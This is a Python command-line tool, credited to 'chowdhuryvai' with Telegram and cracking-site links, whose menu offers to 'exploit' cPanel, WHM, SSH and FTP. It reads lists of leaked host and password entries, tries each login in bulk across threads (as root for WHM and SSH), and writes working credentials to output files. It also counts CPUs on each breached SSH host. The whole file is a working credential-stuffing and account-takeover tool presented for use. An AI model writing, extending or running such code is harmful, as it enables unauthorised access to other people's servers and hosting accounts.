#!/usr/bin/python
# -*- coding: utf-8 -*-
import paramiko
import requests
import time
import threading
import sys
from socket import *
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style, Back, init
import os
import ftplib
import ssl
import urllib.request as urllib2
from urllib.parse import urlparse
from datetime import datetime
import warnings

# Suppress warnings
warnings.simplefilter('ignore')
requests.packages.urllib3.disable_warnings()

# Initialize colorama
init(autoreset=True)

# Color definitions
merah = Fore.LIGHTRED_EX
hijau = Fore.LIGHTGREEN_EX
biru = Fore.BLUE
kuning = Fore.LIGHTYELLOW_EX
cyan = Fore.CYAN
reset = Fore.RESET
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
res = Style.RESET_ALL
yl = Fore.YELLOW
cy = Fore.CYAN
mg = Fore.MAGENTA
bc = Back.GREEN
fr = Fore.RED
sr = Style.RESET_ALL
fb = Fore.BLUE
fc = Fore.LIGHTCYAN_EX
fg = Fore.GREEN
br = Back.RED

# Get current time
now = datetime.now()
dt_string = now.strftime("%H:%M:%S")

def ntime():
    return datetime.now().strftime('%H:%M:%S')

##########################################################################################
# CPANELS
def cpanel(host, user, pswd):
    try:
        s = requests.Session()
        data = {"user": user, "pass": pswd}
        text = s.post("https://" + host + ":2083/login", data=data, verify=False, allow_redirects=False, timeout=3).text
        if "URL=/cpses" in text:
            print(f"{fc}[{gr}VALID{fc}] {res}{host}{gr}|{res}{user}{gr}|{res}{pswd}")
            with open("!Cpanelz33.txt", "a") as fopen:
                fopen.write("https://" + host + ":2083|" + user + "|" + pswd + "\n")
        else:
            print(f"{fc}[{red}BAD{fc}] {res}{host}{red}|{res}{user}{red}|{res}{pswd}")
        s.close()
    except KeyboardInterrupt:
        print("Closed")
        exit()
    except:
        print(f"{fc}[{red}ERROR{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")

# WHM
def whm(host, user, pswd):
    try:
        headers = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}
        s = requests.Session()
        data = {"user": user, "pass": pswd}
        text = s.post("https://" + host + ":2087/login", data=data, headers=headers, verify=False, allow_redirects=False, timeout=15).text
        if "URL=/cpses" in text:
            print(f"{fc}[{gr}VALID{fc}] {res}{host}{gr}|{res}{user}{gr}|{res}{pswd}")
            with open("!Valid_whm.txt", "a") as fopen:
                fopen.write(host + "|" + user + "|" + pswd + "\n")
        else:
            print(f"{fc}[{red}BAD{fc}] {res}{host}{red}|{res}{user}{red}|{res}{pswd}")
            with open("DIE.txt", "a") as fopen:
                fopen.write(host + "|" + user + "|" + pswd + "\n")
        s.close()
    except KeyboardInterrupt:
        print("Closed")
        exit()
    except Exception as eror:
        print(f"{fc}[{red}ERROR{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")
        with open("Error.txt", "a") as fopen:
            fopen.write(host + "|" + user + "|" + pswd + "\n")

# SSH
def l3gion(target, username, password):
    try:
        targetIP = gethostbyname(target)
    except:
        print(f'\t{yl}[{red}INVALID IP{yl}] {fc}-{res} ' + str(target))
        return False
    
    for i in [22]:
        s = socket(AF_INET, SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((targetIP, i))
        if result == 0:
            checkssh(targetIP, 22, username, password)
        else:
            print(f'\t{yl}[{red}PORT{gr}|{yl}' + str(i) + f'{gr}|{red}CLOSED{yl}]{res} ' + targetIP)
        s.close()

def checkssh(ip, port, username, password):
    cmd = 'cat /proc/cpuinfo | grep processor'
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port, username, password, timeout=3)
        stdin, stdout, stderr = ssh.exec_command(cmd)
        outlines = stdout.readlines()
        cpu = 0
        for asu in outlines:
            cpu = cpu + 1
        build = str(ip) + '|' + str(port) + '|' + str(username) + '|' + str(password) + ' - CPU ' + str(cpu)
        print(f'\t{yl}[{gr}LIVE{yl}] {fc}-{gr} ' + str(build))
        with open('!asaLegion_Ssh.txt', 'a') as save:
            save.write(build + '\n')
    except KeyboardInterrupt:
        print('Canceled by user')
    except Exception as err:
        build = str(ip) + '|' + str(port) + '|' + str(username) + '|' + str(password)
        print(f'\t{yl}[{red}DIE{yl}] {fc}-{res} ' + str(build))

# FTP
def gas(host, username, password):
    try:
        ftp = ftplib.FTP(host, timeout=15)
        login_response = ftp.login(username, password)
        if '230' in login_response:
            print(f"{fc}[{gr}{dt_string}{fc}] {fc}[{gr}{host}{fc}] - {fc}[{yl}{username}{fc}|{res}{password}{fc}] {fc}-{gr}LIVE")
            with open('lives.txt', 'a') as f:
                f.write(host + '|' + username + '|' + password + '\n')
        else:
            print(f"{fc}[{gr}{dt_string}{fc}] {fc}[{red}{host}{fc}] - {fc}[{mg}{username}{fc}|{res}{password}{fc}] {fc}-{red}DIE")
    except:
        print(f"{fc}[{gr}{dt_string}{fc}] {fc}[{red}{host}{fc}] - {fc}[{mg}{username}{fc}|{res}{password}{fc}] {fc}-{red}DIE")

# Processing functions
def bagian(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = prepare[3]
        password = prepare[4]
        cpanel(host, user, password)
        if "_" in prepare[3]:
            userr = prepare[3].split("_")[0]
            ppp = str(userr)
            cpanel(host, ppp, password)
    except:
        pass

def bagian2(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = 'root'
        password = prepare[4]
        whm(host, user, password)
    except:
        pass

def bagian3(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = 'root'
        password = prepare[3]
        l3gion(host, user, password)
    except:
        pass

def bagian4(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = prepare[3]
        password = prepare[4]
        gas(host, user, password)
        if "_" in prepare[3]:
            userr = prepare[3].split("_")[0]
            ppp = str(userr)
            gas(host, ppp, password)
    except:
        pass

def banner():
    print(f'''
{fc}╔══════════════════════════════════════════════════════════════╗
{fc}║                                                              ║
{fc}║    ██████ ██   ██  ██████  ██     ██ ██   ██ ██████  ██    ║
{fc}║   ██      ██   ██ ██    ██ ██     ██ ██   ██ ██   ██ ██    ║
{fc}║   ██      ███████ ██    ██ ██  █  ██ ███████ ██   ██ ██    ║
{fc}║   ██      ██   ██ ██    ██ ██ ███ ██ ██   ██ ██   ██ ██    ║
{fc}║    ██████ ██   ██  ██████   ███ ███  ██   ██ ██████  ██    ║
{fc}║                                                              ║
{fc}║                   ██    ██  █████  ██                       ║
{fc}║                   ██    ██ ██   ██ ██                       ║
{fc}║                   ██    ██ ███████ ██                       ║
{fc}║                    ██  ██  ██   ██ ██                       ║
{fc}║                     ████   ██   ██ ██                       ║
{fc}║                                                              ║
{fc}╚══════════════════════════════════════════════════════════════╝

{gr}==============================================================
{gr}              Created by: chowdhuryvai
{gr}        Telegram ID: https://t.me/darkvaiadmin
{gr}     Telegram Channel: https://t.me/windowspremiumkey
{gr}          Website: https://crackyworld.com/
{gr}==============================================================

{fc}[ EXPLOIT MENU ]
{fc}================
{fc}[{gr}1{fc}] {gr}EXPLOIT CPANELS
{fc}[{gr}2{fc}] {gr}EXPLOIT WHM  
{fc}[{gr}3{fc}] {gr}EXPLOIT SSH
{fc}[{gr}4{fc}] {gr}EXPLOIT FTP
{fc}================
''')

def main():
    banner()

    while True:
        try:
            choice = input(f'{red}[{cy}chowdhuryvai{res}] [{mg}Select Option{res}] => {gr}')
            
            if choice in ["1", "2", "3", "4"]:
                list_file = input(f'{red}[{cy}chowdhuryvai{res}] [{gr}Enter List File{res}] => {gr}')
                
                if not os.path.exists(list_file):
                    print(f'{red}[ERROR] File not found: {list_file}')
                    continue
                
                try:
                    with open(list_file, 'r') as f:
                        lists = f.read().splitlines()
                except:
                    print(f'{red}[ERROR] Cannot read file: {list_file}')
                    continue

                print(f'''
{cy}[ THREADING METHOD ]
{cy}====================
{cy}[1] MultiProcessing
{cy}[2] ThreadPool
{cy}====================
''')
                chosethrd = input(f'{red}[{cy}chowdhuryvai{res}] [{yl}Select Method{res}] => {gr}')
                
                if chosethrd in ['1', '2']:
                    mp = input(f'{red}[{cy}chowdhuryvai{res}] [{yl}Enter Threads{res}] => {gr}')
                    
                    try:
                        threads = int(mp)
                    except:
                        print(f'{red}[ERROR] Invalid thread number')
                        continue
                    
                    # Select the appropriate function based on choice
                    func_map = {
                        "1": bagian,
                        "2": bagian2, 
                        "3": bagian3,
                        "4": bagian4
                    }
                    
                    selected_func = func_map[choice]
                    
                    print(f'{gr}[INFO] Starting exploitation with {threads} threads...')
                    
                    if chosethrd == '1':
                        pp = ThreadPool(threads)
                        pp.map(selected_func, lists)
                        pp.close()
                        pp.join()
                    else:
                        pp = ThreadPool(threads)
                        pp.map(selected_func, lists)
                        pp.close()
                        pp.join()
                        
                    print(f'{gr}[INFO] Exploitation completed!')
                        
                else:
                    print(f'{red}[ERROR] Invalid method selection')
                    
            else:
                print(f'{red}[ERROR] Invalid option. Please choose 1-4')
                
        except KeyboardInterrupt:
            print(f'\n{yl}[INFO] Script terminated by user')
            break
        except Exception as e:
            print(f'{red}[ERROR] {str(e)}')

if __name__ == "__main__":
    main()
